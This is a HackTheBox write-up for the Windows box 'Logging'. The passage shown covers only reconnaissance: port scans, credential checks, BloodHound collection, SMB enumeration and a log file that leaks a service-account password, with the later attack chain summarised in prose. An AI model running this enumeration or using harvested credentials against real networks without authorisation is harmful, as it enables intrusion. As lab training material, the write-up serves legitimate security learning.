---
maquina: "Logging"
dificultad: "Medium"
os: "Windows"
plataforma: "htb"
release: "18 Apr 2026"
retire: "18 Jul 2026"
creadores: "LazyTitan33"
htb_url: "https://hackthebox.com/machines/logging"
app_url: "https://app.hackthebox.com/machines/888"
url: "https://0xdf.gitlab.io/2026/07/18/htb-logging.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Logging is a Windows domain controller offered as an assume breach box, starting with credentials for a low privileged domain user. I’ll find an application log on an open SMB share that leaks an old password for a service account, then guess the current password by incrementing the year. That account can only authenticate over Kerberos, and it has GenericWrite over a health monitoring machine account, which I’ll abuse with a shadow credential and gMSA credentials to get a shell. From there I’ll hijack an insecure auto-update program that loads a DLL from a world-writable directory to pivot to the next user. That user is in the IT group with enrollment rights on a certificate template vulnerable to ESC17, which lets me request a certificate for any server name. I’ll issue a certificate for the decommissioned WSUS server, add a DNS record pointing it at my host, and stand up a rogue WSUS server that pushes a malicious update adding my initial user to the administrators group for full control of the domain.

## Recon

### Initial Scanning

`nmap` finds 30 open TCP ports:

```console
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.245.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-10 23:04 UTC
Nmap scan report for 10.129.245.130
Host is up, received reset ttl 127 (0.023s latency).
Not shown: 65505 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
8530/tcp  open  unknown          syn-ack ttl 127
8531/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
49715/tcp open  unknown          syn-ack ttl 127
49745/tcp open  unknown          syn-ack ttl 127
49768/tcp open  unknown          syn-ack ttl 127
49804/tcp open  unknown          syn-ack ttl 127
49839/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds
oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,47001,49664,49665,49666,49667,49673,49696,49697,49698,49715,49745,49768,49804,49839 -sCV 10.129.245.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-10 23:09 UTC
Nmap scan report for 10.129.245.130
Host is up (0.020s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-11 06:09:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-07-11T06:10:53+00:00; +7h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-11T06:10:53+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-07-11T06:10:53+00:00; +7h00m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-11T06:10:53+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods:
|_  Potentially risky methods: TRACE
8531/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject:
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.logging.htb
| Not valid before: 2026-04-24T15:49:07
|_Not valid after:  2027-04-24T15:49:07
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: 2026-07-11T06:10:53+00:00; +7h00m02s from scanner time.
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49698/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
49768/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
49839/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-11T06:10:45
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.92 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `logging.htb`, and the hostname is `DC01`. The noteworthy services exposed are:

- 53 - DNS
- 80 - HTTP (IIS)
- 88 - Kerberos
- 389, 636, 3268, 3269 - LDAP
- 445 - SMB
- 5985 - WinRM
- 8530, 8531 - WSUS

nmap didn’t identify 8530 and 8531, but those are the default HTTP and HTTPS ports for Windows Server Update Services (WSUS), which turns out to be central to this box.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```console
oxdf@hacky$ netexec smb 10.129.245.130 --generate-hosts-file hosts
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts
oxdf@hacky$ vim /etc/hosts
oxdf@hacky$ head -1 /etc/hosts
10.129.245.130     DC01.logging.htb logging.htb DC01
```

All of the ports show a TTL of 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate dc01.logging.htb` before any actions that use Kerberos auth.

### Initial Credentials

HackTheBox provides the following scenario associated with Logging:

As is common in real life pentests, you will start the Logging box with credentials for the following account wallace.everette / Welcome2026@

The creds do work:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
```

They also work for LDAP, but not WinRM (unsurprisingly):

```console
oxdf@hacky$ netexec ldap dc01.logging.htb -u wallace.everette -p Welcome2026@
LDAP        10.129.245.130  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
LDAP        10.129.245.130  389    DC01             [+] logging.htb\wallace.everette:Welcome2026@
oxdf@hacky$ netexec winrm dc01.logging.htb -u wallace.everette -p Welcome2026@
WINRM       10.129.245.130  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb)
WINRM       10.129.245.130  5985   DC01             [-] logging.htb\wallace.everette:Welcome2026@
```

Given that, I’ll want to prioritize things like:

- Website
- SMB shares
- Bloodhound (which includes most of the data from LDAP)
- ADCS

### Website - TCP 80

#### Site

The website is the default IIS page:

![image-20260710194814823](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710194814823.png)

#### Tech Stack

The HTTP response headers show IIS and ASP.NET:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Fri, 17 Apr 2026 00:26:07 GMT
Accept-Ranges: bytes
ETag: "7ce2abc80cedc1:0"
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 11 Jul 2026 06:47:53 GMT
Content-Length: 703
```

The main page loads as `/iisstart.htm`, which is the default IIS setup.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything interesting:

```console
oxdf@hacky$ feroxbuster -u http://logging.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://logging.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      156c http://logging.htb/aspnet_client => http://logging.htb/aspnet_client/
200      GET      334l     2089w   180418c http://logging.htb/iisstart.png
200      GET       32l       55w      703c http://logging.htb/
404      GET       40l      156w     1888c http://logging.htb/con
301      GET        2l       10w      156c http://logging.htb/Aspnet_client => http://logging.htb/Aspnet_client/
404      GET       40l      156w     1902c http://logging.htb/aspnet_client/con
301      GET        2l       10w      156c http://logging.htb/aspnet_Client => http://logging.htb/aspnet_Client/
404      GET       40l      156w     1888c http://logging.htb/aux
404      GET       40l      156w     1902c http://logging.htb/aspnet_client/aux
404      GET       40l      156w     1902c http://logging.htb/Aspnet_client/con
301      GET        2l       10w      167c http://logging.htb/aspnet_client/system_web => http://logging.htb/aspnet_client/system_web/
404      GET       40l      156w     1902c http://logging.htb/aspnet_Client/con
404      GET       40l      156w     1902c http://logging.htb/Aspnet_client/aux
301      GET        2l       10w      156c http://logging.htb/ASPNET_CLIENT => http://logging.htb/ASPNET_CLIENT/
301      GET        2l       10w      167c http://logging.htb/Aspnet_client/system_web => http://logging.htb/Aspnet_client/system_web/
404      GET       40l      156w     1913c http://logging.htb/aspnet_client/system_web/con
404      GET       40l      156w     1902c http://logging.htb/aspnet_Client/aux
400      GET        6l       26w      324c http://logging.htb/error%1F_log
400      GET        6l       26w      324c http://logging.htb/aspnet_client/error%1F_log
301      GET        2l       10w      167c http://logging.htb/aspnet_Client/system_web => http://logging.htb/aspnet_Client/system_web/
404      GET       40l      156w     1902c http://logging.htb/ASPNET_CLIENT/con
404      GET       40l      156w     1913c http://logging.htb/aspnet_client/system_web/aux
404      GET       40l      156w     1888c http://logging.htb/prn
404      GET       40l      156w     1902c http://logging.htb/aspnet_client/prn
404      GET       40l      156w     1913c http://logging.htb/Aspnet_client/system_web/con
400      GET        6l       26w      324c http://logging.htb/Aspnet_client/error%1F_log
404      GET       40l      156w     1902c http://logging.htb/ASPNET_CLIENT/aux
404      GET       40l      156w     1913c http://logging.htb/aspnet_Client/system_web/con
404      GET       40l      156w     1913c http://logging.htb/Aspnet_client/system_web/aux
404      GET       40l      156w     1902c http://logging.htb/Aspnet_client/prn
400      GET        6l       26w      324c http://logging.htb/aspnet_Client/error%1F_log
301      GET        2l       10w      167c http://logging.htb/ASPNET_CLIENT/system_web => http://logging.htb/ASPNET_CLIENT/system_web/
404      GET       40l      156w     1913c http://logging.htb/aspnet_Client/system_web/aux
404      GET       40l      156w     1902c http://logging.htb/aspnet_Client/prn
400      GET        6l       26w      324c http://logging.htb/aspnet_client/system_web/error%1F_log
404      GET       40l      156w     1913c http://logging.htb/ASPNET_CLIENT/system_web/con
404      GET       40l      156w     1913c http://logging.htb/aspnet_client/system_web/prn
400      GET        6l       26w      324c http://logging.htb/ASPNET_CLIENT/error%1F_log
400      GET        6l       26w      324c http://logging.htb/Aspnet_client/system_web/error%1F_log
404      GET       40l      156w     1913c http://logging.htb/ASPNET_CLIENT/system_web/aux
404      GET       40l      156w     1902c http://logging.htb/ASPNET_CLIENT/prn
404      GET       40l      156w     1913c http://logging.htb/Aspnet_client/system_web/prn
400      GET        6l       26w      324c http://logging.htb/aspnet_Client/system_web/error%1F_log
404      GET       40l      156w     1913c http://logging.htb/aspnet_Client/system_web/prn
400      GET        6l       26w      324c http://logging.htb/ASPNET_CLIENT/system_web/error%1F_log
404      GET       40l      156w     1913c http://logging.htb/ASPNET_CLIENT/system_web/prn
[####################] - 3m    270027/270027  0s      found:46      errors:778
[####################] - 84s    30000/30000   359/s   http://logging.htb/
[####################] - 82s    30000/30000   368/s   http://logging.htb/aspnet_client/
[####################] - 2m     30000/30000   288/s   http://logging.htb/Aspnet_client/
[####################] - 2m     30000/30000   293/s   http://logging.htb/aspnet_Client/
[####################] - 2m     30000/30000   274/s   http://logging.htb/aspnet_client/system_web/
[####################] - 2m     30000/30000   282/s   http://logging.htb/ASPNET_CLIENT/
[####################] - 2m     30000/30000   295/s   http://logging.htb/Aspnet_client/system_web/
[####################] - 89s    30000/30000   336/s   http://logging.htb/aspnet_Client/system_web/
[####################] - 71s    30000/30000   423/s   http://logging.htb/ASPNET_CLIENT/system_web/
```

### BloodHound

#### Collection

I’ll collect BloodHound data using [RustHound-CE](https://github.com/g0h4n/RustHound-CE):

```console
oxdf@hacky$ rusthound-ce -d logging.htb -u wallace.everette -p 'Welcome2026@' --zip -c All
---------------------------------------------------
Initializing RustHound-CE at 00:37:22 on 07/11/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-07-11T00:37:22Z INFO  rusthound_ce] Verbosity level: Info
[2026-07-11T00:37:22Z INFO  rusthound_ce] Collection method: All
[2026-07-11T00:37:22Z INFO  rusthound_ce::ldap] Connected to LOGGING.HTB Active Directory!
[2026-07-11T00:37:22Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-07-11T00:37:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-11T00:37:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=logging,DC=htb
[2026-07-11T00:37:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-11T00:37:24Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=logging,DC=htb
[2026-07-11T00:37:24Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-11T00:37:24Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=logging,DC=htb
[2026-07-11T00:37:24Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-11T00:37:25Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=logging,DC=htb
[2026-07-11T00:37:25Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-11T00:37:25Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=logging,DC=htb
[2026-07-11T00:37:25Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 3%
[2026-07-11T00:37:25Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
[2026-07-11T00:37:25Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 14 users parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 65 groups parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-07-11T00:37:25Z INFO  rusthound_ce::json::maker::common] .//20260711003725_logging-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 00:37:25 on 07/11/26! Happy Graphing!
```

#### Analysis

I’ll upload the data into the BloodHound community docker edition. The first thing I’ll do is find Wallace.Everette and mark them owned:

![image-20260710204303671](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710204303671.png)

They have no outbound control other than being a member of the Domain Users group, which isn’t helpful:

![image-20260710204343347](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710204343347.png)

Domain Users shows 11 users:

![image-20260710204517625](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710204517625.png)

The Domain Computers group has one computer account:

![image-20260710204554144](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710204554144.png)

### SMB - TCP 445

#### Users

SMB gives the same users as BloodHound:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@ --users
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
SMB         10.129.245.130  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.245.130  445    DC01             Administrator                 2026-04-16 14:41:53 0       Built-in account for administering the computer/domain
SMB         10.129.245.130  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.245.130  445    DC01             krbtgt                        2026-04-16 14:47:15 0       Key Distribution Center Service Account
SMB         10.129.245.130  445    DC01             svc_recovery                  2026-04-16 23:09:49 0
SMB         10.129.245.130  445    DC01             jaylee.clifton                2026-04-16 23:09:49 0
SMB         10.129.245.130  445    DC01             monique.chip                  2026-04-16 23:09:49 0
SMB         10.129.245.130  445    DC01             kyson.abel                    2026-04-16 23:09:50 0
SMB         10.129.245.130  445    DC01             fable.milford                 2026-04-16 23:09:50 0
SMB         10.129.245.130  445    DC01             wellington.kylan              2026-04-16 23:09:50 0
SMB         10.129.245.130  445    DC01             serina.philander              2026-04-16 23:09:50 0
SMB         10.129.245.130  445    DC01             wallace.everette              2026-04-16 23:09:50 0
SMB         10.129.245.130  445    DC01             toby.brynleigh                2026-04-16 23:09:50 0
SMB         10.129.245.130  445    DC01             [*] Enumerated 12 local users: logging
```

It actually shows 12 (more than the 11 in the Domain Users group) because it counts the guest account.

#### Shares

The host has the standard DC shares, as well as two more, `Logs` and `WSUSTemp`:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u wallace.everette -p Welcome2026@ --shares
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
SMB         10.129.245.130  445    DC01             [*] Enumerated shares
SMB         10.129.245.130  445    DC01             Share           Permissions     Remark
SMB         10.129.245.130  445    DC01             -----           -----------     ------
SMB         10.129.245.130  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.245.130  445    DC01             C$                              Default share
SMB         10.129.245.130  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.245.130  445    DC01             Logs            READ
SMB         10.129.245.130  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.245.130  445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.245.130  445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

I can try to access `WSUSTemp` with `smbclient`, but this user doesn’t have access.

#### Logs

The `Logs` share has four files:

```console
oxdf@hacky$ smbclient //dc01.logging.htb/Logs -U wallace.everette%Welcome2026@
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 16 23:10:09 2026
  ..                                  D        0  Thu Apr 16 23:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026

                6657279 blocks of size 4096. 1873839 blocks available
```

I’ll grab all four:

```console
smb: \> prompt off
smb: \> mget *
getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (95.3 KiloBytes/sec) (average 14.5 KiloBytes/sec)
getting file \Service_State.log of size 468 as Service_State.log (5.6 KiloBytes/sec) (average 13.5 KiloBytes/sec)
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (4.7 KiloBytes/sec) (average 11.3 KiloBytes/sec)
```

None of the files are very long:

```console
oxdf@hacky$ wc -l *.log
   23 Audit_Heartbeat.log
   79 IdentitySync_Trace_20260219.log
    5 Service_State.log
   13 TaskMonitor.log
  120 total
```

`Service_State.log` shows the `IdentitySync` service starting and stopping:

```plaintext
[2026-02-18 06:00:00] [SYSTEM] Service 'IdentitySync' received START command.
[2026-02-18 06:00:02] [SYSTEM] Service 'IdentitySync' entered RUNNING state.
[2026-02-19 06:00:00] [SYSTEM] Service 'IdentitySync' received STOP command.
[2026-02-19 06:00:05] [SYSTEM] Service 'IdentitySync' entered STOPPED state.
[2026-02-19 06:01:00] [SYSTEM] Service 'IdentitySync' received START command.
[2026-02-19 06:01:03] [SYSTEM] Service 'IdentitySync' entered RUNNING state.
```

The only log with anything obviously interesting is `IdentitySync_Trace_20260219.log`:

```plaintext
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 02:45:00.112] [PID:1024] [Thread:01] INFO  - Maintenance: Rotating log files for 'IdentitySync'...
[2026-02-19 02:50:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).
[2026-02-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)
[2026-02-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16GB
[2026-02-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...
[2026-02-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
[2026-02-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
[2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------
[2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\svc_recovery. Checking alternate Domain Controller...
